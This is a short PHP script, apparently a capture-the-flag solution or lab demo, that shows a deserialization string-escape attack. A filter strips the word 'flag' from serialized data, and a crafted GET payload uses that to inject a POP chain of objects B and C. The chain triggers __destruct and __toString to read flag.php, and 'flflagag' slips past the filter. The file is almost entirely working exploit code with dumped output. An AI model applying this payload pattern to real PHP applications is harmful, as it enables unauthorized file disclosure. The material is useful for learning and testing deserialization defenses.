<?php
error_reporting(0);
function filter_nohack($data) {
    return str_replace('flag', '', $data);

}
class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}
class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}
class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
       return 'nice';
    }
}

$a_new  = new A('flag',new B());
$a_new -> password -> b = new C();
$a_new -> password -> b -> c = 'flag.php';

var_dump(serialize($a_new));

$_GET['a']  = 'flagflagflagflagflagflagflag';
$_GET['b'] = 'XXXXX";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flflagag.php";}}}';

$a = new A($_GET['a'],$_GET['b']);


$b = filter_nohack(serialize($a));
var_dump($b);
var_dump(unserialize($b));

?>